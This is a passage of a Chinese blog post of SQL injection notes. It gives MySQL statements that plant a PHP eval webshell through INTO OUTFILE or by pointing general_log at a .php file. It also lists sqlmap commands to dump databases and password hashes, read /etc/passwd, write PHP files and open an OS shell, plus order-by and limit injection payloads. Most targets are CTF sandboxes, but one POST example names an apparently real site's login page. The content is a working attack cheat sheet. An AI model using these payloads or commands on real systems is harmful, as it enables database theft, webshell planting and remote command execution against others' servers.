select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;INTO OUTFILE &#39;/home/wwwroot/default/p.php&#39;

如果没有，查看是否有开启日志记录
SHOW GLOBAL VARIABLES LIKE ‘%general%’
日志记录功能关闭，但是可以开启
SET GLOBAL general_log = ON
SET GLOBAL general_log_file = &#39;C:/phpstudy/WWW/test.php&#39;
select &#39;&lt;?php eval ($_POST[hack]);?&gt;&#39;
执行这条语句之后，日志会将select后的查询语句记录进日志，从而让日志变成一个一句话木马</code></pre><h1 id="sqlmap" class="heading-element"><span>sqlmap</span>
  <a href="#sqlmap" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><a href="https://xz.aliyun.com/t/3010"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/3010</a></p>
<p>查询sqlmap是否存在注入命令
sqlmap.py -u url/?id=1
查询当前用户下的所有数据库
sqlmap.py -u url/?id=1 &ndash;dbs
获取数据库的表名
sqlmap.py -u url/?id=1 -D (数据库名) &ndash;tables
获取表中的字段名
sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) &ndash;columns
获取字段的内容
sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) -C (表内的字段名) &ndash;dump
查询数据库的所有用户
sqlmap.py -u url/?id=1 &ndash;users
查询数据库的所有密码
sqlmap.py -u url/?id=1 &ndash;passwords
查询数据库名称
sqlmap.py -u url/?id=1 &ndash;current-db</p>
<p>当level为2的时候，会测试cookie，当level为3的时候，会测试referer
● cookie注入
sqlmap -u &ldquo;<a href="http://challenge-f1edf57468fa1d1e.sandbox.ctfhub.com:10800/%22"target="_blank" rel="external nofollow noopener noreferrer">http://challenge-f1edf57468fa1d1e.sandbox.ctfhub.com:10800/"</a> &ndash;cookie &ldquo;id=1&rdquo; &ndash;level 2 -D sqli -T lfjweaxdqf -C rtncvknbao &ndash;dump  &ndash;batch
● UA注入
sqlmap -u <a href="http://challenge-220e14565861aa9a.sandbox.ctfhub.com:10800/"target="_blank" rel="external nofollow noopener noreferrer">http://challenge-220e14565861aa9a.sandbox.ctfhub.com:10800/</a> &ndash;level 3 &ndash;dbs
sqlmap -r “a.txt”  -p “User-Agent” –dbms mysql  &ndash;dbs &ndash;level 3 &ndash;batch
sqlmap -r “a.txt”  -p “Referer” &ndash;dbs &ndash;level 3 &ndash;batch
sqlmap -r &ldquo;a.txt&rdquo; -level 3 -D sqli &ndash;dump &ndash;batch</p>
<ul>
<li>
<p>post注入</p>
<pre tabindex="0"><code>sqlmap -u http://vip.fj0730.cn/login.asp --data &#34;username=admin&amp;password=123456&amp;submit=%E7%99%BB%E5%BD%95&#34;  --batch  -</code></pre></li>
</ul>
<p>● 过滤空格
这里需要用到sqlmap的脚本
space2comment.py 用&rdquo;/**/&ldquo;替换空格符
sqlmap -u &ldquo;<a href="http://challenge-08073c0be83e8616.sandbox.ctfhub.com:10800/?id=1%22"target="_blank" rel="external nofollow noopener noreferrer">http://challenge-08073c0be83e8616.sandbox.ctfhub.com:10800/?id=1"</a> -D sqli &ndash;dump &ndash;tamper=space2comment.py &ndash;batch &ndash;tamper=space2plus.py</p>
<pre tabindex="0"><code>sqlmap -r 1.txt --batch  –file-read=&#39;/etc/passwd&#39;

sqlmap -r 1.txt --current-user
sqlmap -r 1.txt privileges -U root
sqlmap -r 1.txt --batch   –file-write 1.php  –file-dest /var/www/html/1.php --dbms MySql   需要dba权限

sqlmap -r 1.txt  --os-cmd &#34;cat /f*&#34; -  //执行cmd代表的命令，如cd C:/
sqlmap -r 1.txt  --os-shell  //进入数据库自带的shell</code></pre><h1 id="注入位置" class="heading-element"><span>注入位置</span>
  <a href="#%e6%b3%a8%e5%85%a5%e4%bd%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><pre tabindex="0"><code>select ① *② from ctf③ where id=1④ order by name⑤ limit 0,1⑥;</code></pre><p>注入点越靠前，可操作性就越强</p>
<ol>
<li>
<p>代表select动词可控，可以改写整条sql语句，甚至可以变成delete、update语句，还可以使用set修改一些环境变量</p>
</li>
<li>
<p>查询字段可控，可以查询任何数据</p>
</li>
<li>
<p>表名可控，可以更换表名，需要注意前面的是否为*，不过也可以构造任意的where</p>
<pre tabindex="0"><code>select ① *② from [test where 1=1 and select ...#] where id=1④ order by name⑤ limit 0,1⑥;</code></pre></li>
<li>
<p>最常见的注入位置</p>
</li>
<li>
<p>成为order by注入，这里已经无法使用union了需要使用一些函数来引入SQL语句，如if、rand等</p>
<p>时间注入</p>
<pre tabindex="0"><code>select ① *② from ctf③ where id=1④ order by [id,if(1=2,1,sleep(1)] limit 0,1⑥;</code></pre><p>由于order by位置对参数有要求，可以利用特殊符号引发报错</p>
<p>盲注（修改1=2通过是否报错来判断）</p>
<pre tabindex="0"><code>select ① *② from ctf③ where id=1④ order by [id,1 and extractvalue(1,if(1=2,1,&#39;@&#39;))] limit 0,1⑥;</code></pre></li>
<li>
<p>limit注入，目前唯一公开的方法是使用<code>procedure analyse</code>语句注入，并且在mysql 5.6.6修复了，5.0-5.6.6才可以</p>
<p>需要注意的是如果limit前面没有orderby也是可以用union的</p>
<pre tabindex="0"><code>select ① *② from ctf③ where id=1④ order by name⑤ limit [1,1 procedure analyse(1,extractvalue(rand(),concat(0x3a,data)))];</code></pre></li>
</ol></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="post-tag" title="Tags - SQL注入">SQL注入</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93/80/" class="post-nav-item" rel="prev" title="SQL进阶操作"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SQL进阶操作</a>
      <a href="/posts/owasp/sql%E6%B3%A8%E5%85%A5/118/" class="post-nav-item" rel="next" title="SQL注入-Mysql8新特性">SQL注入-Mysql8新特性<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
